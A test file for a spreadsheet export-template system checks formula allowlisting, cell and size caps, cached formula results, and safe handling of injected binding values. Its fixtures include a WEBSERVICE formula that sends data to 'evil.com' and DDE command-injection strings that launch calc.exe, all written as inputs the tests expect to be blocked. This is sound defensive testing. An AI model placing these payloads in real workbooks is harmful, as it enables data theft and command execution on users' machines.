import { describe, it, expect } from 'vitest';
import {
  validateSingleFormula,
  validateGridFormulas,
  validateGridCaps,
  GRID_LIMITS,
  type GridExportTemplateDefinition,
  type GridSheetDefinition,
} from '@config-platform/schema';
import { ExportTemplateBundleSchema } from '../src/workspace/export-import-service.js';
import { SandboxedFormulaEvaluator, evaluateAndCacheSheetFormulas } from '../src/records/export/formula-evaluator.js';
import { GridHydrator, GridHydrationForbiddenError } from '../src/records/export/grid-hydrator.js';
import { gridXlsxRenderer } from '../src/records/export/grid-xlsx-renderer.js';

describe('Phase 2B: Grid Validation, Formula Caching & Security Guarantees', () => {
  describe('1. Import & Creation Path Formula Validation Allowlist', () => {
    it('rejects an imported template with WEBSERVICE via ExportTemplateBundleSchema and validateGridFormulas', () => {
      const maliciousGridTemplate = {
        id: 'et_malicious',
        name: 'Evil Template',
        entityId: 't_customers',
        version: 1,
        draft: {
          kind: 'grid',
          version: 1,
          sheets: [
            {
              id: 's1',
              name: 'Sheet1',
              cells: {
                '0:0': {
                  formula: '=WEBSERVICE("http://evil.com/exfiltrate?data=123")',
                },
              },
            },
          ],
        },
      };

      const parsed = ExportTemplateBundleSchema.safeParse(maliciousGridTemplate);
      expect(parsed.success).toBe(false);
      if (!parsed.success) {
        expect(
          parsed.error.issues.some((issue) =>
            issue.message.includes('Restricted functions are not allowed in formulas')
          )
        ).toBe(true);
      }
    });

    it('rejects external references, DDE commands, and unallowed functions on import/save', () => {
      expect(validateSingleFormula("='[OtherWorkbook.xlsx]Sheet1'!A1").valid).toBe(false);
      expect(validateSingleFormula("=cmd|'/c calc.exe'!A1").valid).toBe(false);
      expect(validateSingleFormula('=FILTERXML("<x>y</x>", "//x")').valid).toBe(false);
      expect(validateSingleFormula('=VLOOKUP(10, A1:B10, 2, FALSE)').valid).toBe(false);
    });
  });

  describe('2. Cap Split: Stored Template vs Rendered Workbook', () => {
    it('enforces stored template cap of 20,000 non-empty cells', () => {
      const cells: Record<string, any> = {};
      for (let i = 0; i < 20_001; i++) {
        cells[`${i}:0`] = { value: i + 1 };
      }
      const template = {
        sheets: [{ id: 's1', cells }],
      };
      const check = validateGridCaps(template);
      expect(check.valid).toBe(false);
      expect(check.errors.some((e) => e.includes('20,000 non-empty cells'))).toBe(true);
    });

    it('enforces stored template cap of 2 MB JSON byte length', () => {
      const bigString = 'A'.repeat(2 * 1024 * 1024 + 100);
      const template = {
        sheets: [{ id: 's1', cells: { '0:0': { value: bigString } } }],
      };
      const check = validateGridCaps(template);
      expect(check.valid).toBe(false);
      expect(check.errors.some((e) => e.includes('exceeds maximum limit of 2 MB'))).toBe(true);
    });

    it('verifies rendered workbook cap limits in GRID_LIMITS constants', () => {
      expect(GRID_LIMITS.MAX_STORED_NON_EMPTY_CELLS).toBe(20_000);
      expect(GRID_LIMITS.MAX_RENDERED_DATA_ROWS).toBe(10_000);
      expect(GRID_LIMITS.MAX_RENDERED_CELLS).toBe(200_000);
    });
  });

  describe('3. Allowlisted Formulas & Cached Evaluator Results', () => {
    it('evaluates and caches known results for SUM, AVERAGE, MIN, MAX, COUNT, IF, ROUND, ABS after band shifting', () => {
      // Create a sheet where rows 3..7 represent expanded records
      const sheet: GridSheetDefinition = {
        id: 's_calc',
        name: 'Calculations',
        order: 0,
        cells: {
          // Input rows 3..7 (5 items: 10, 20, 30, 40, 50)
          '2:1': { value: 10 },
          '3:1': { value: 20 },
          '4:1': { value: 30 },
          '5:1': { value: 40 },
          '6:1': { value: 50 },

          // Formulas referencing the shifted band B3:B7 (coords 2:1 to 6:1)
          '8:0': { formula: '=SUM(B3:B7)' },          // Expected: 150
          '9:0': { formula: '=AVERAGE(B3:B7)' },      // Expected: 30
          '10:0': { formula: '=MIN(B3:B7)' },         // Expected: 10
          '11:0': { formula: '=MAX(B3:B7)' },         // Expected: 50
          '12:0': { formula: '=COUNT(B3:B7)' },       // Expected: 5
          '13:0': { formula: '=IF(B3 > 0, 100, 0)' }, // Expected: 100 (B3 is 10)
          '14:0': { formula: '=ROUND(10.567, 2)' },   // Expected: 10.57
          '15:0': { formula: '=ABS(-42.5)' },         // Expected: 42.5
        },
      };

      const { evaluatedCount, hasUnevaluatedFormula } = evaluateAndCacheSheetFormulas(sheet);

      expect(evaluatedCount).toBe(8);
      expect(hasUnevaluatedFormula).toBe(false);

      // Verify cached results stored directly on cell definitions
      expect(sheet.cells['8:0'].value).toBe(150);
      expect(sheet.cells['9:0'].value).toBe(30);
      expect(sheet.cells['10:0'].value).toBe(10);
      expect(sheet.cells['11:0'].value).toBe(50);
      expect(sheet.cells['12:0'].value).toBe(5);
      expect(sheet.cells['13:0'].value).toBe(100);
      expect(sheet.cells['14:0'].value).toBe(10.57);
      expect(sheet.cells['15:0'].value).toBe(42.5);
    });

    it('sets fullCalcOnLoad when formula cannot be evaluated by sandboxed evaluator', () => {
      const template: GridExportTemplateDefinition = {
        kind: 'grid',
        version: 1,
        sheets: [
          {
            id: 's_uncached',
            name: 'Uncached Sheet',
            order: 0,
            cells: {
              '0:0': {
                formula: '=SOME_UNSUPPORTED_FN(A1)',
                value: null, // Uncached
              },
            },
          },
        ],
      };

      const wb = gridXlsxRenderer.renderToWorkbook(template);
      expect(wb.calcProperties.fullCalcOnLoad).toBe(true);
    });
  });

  describe('4. Single-cell Bindings via Expression Evaluator & String Safety', () => {
    it('evaluates single-cell bindings to tenant, user, date, and params without concatenating into formulas', async () => {
      const hydrator = new GridHydrator();

      const template: GridExportTemplateDefinition = {
        kind: 'grid',
        version: 1,
        sheets: [
          {
            id: 's_bindings',
            name: 'Bindings Sheet',
            order: 0,
            cells: {
              '0:0': { binding: '{{ tenant.name }}' },
              '1:0': { binding: '{{ user.email }}' },
              '2:0': { binding: '{{ user.role }}' },
              '3:0': { binding: '{{ params.fiscalYear }}' },
              // Dangerous formula prefix string
              '4:0': { binding: '{{ params.formulaInjection }}' },
            },
          },
        ],
      };

      const hydrated = await hydrator.hydrateGridDefinition(template, {
        tenantId: 't_demo_co',
        tenantName: 'Acme Corporation',
        userRole: 'admin',
        userId: 'u_101',
        userEmail: 'admin@acme.com',
        parameters: {
          fiscalYear: 2026,
          formulaInjection: '=CMD|"/c calc.exe"!A1',
        },
      });

      const cells = hydrated.sheets[0].cells;
      expect(cells['0:0'].value).toBe('Acme Corporation');
      expect(cells['0:0'].formula).toBeUndefined();

      expect(cells['1:0'].value).toBe('admin@acme.com');
      expect(cells['1:0'].formula).toBeUndefined();

      expect(cells['2:0'].value).toBe('admin');
      expect(cells['2:0'].formula).toBeUndefined();

      expect(cells['3:0'].value).toBe(2026);
      expect(cells['3:0'].formula).toBeUndefined();

      // Dangerous string is safely marked with text format '@' and NEVER written as formula
      expect(cells['4:0'].value).toBe('=CMD|"/c calc.exe"!A1');
      expect(cells['4:0'].formula).toBeUndefined();
      expect(cells['4:0'].numFmt).toBe('@');
    });
  });
});
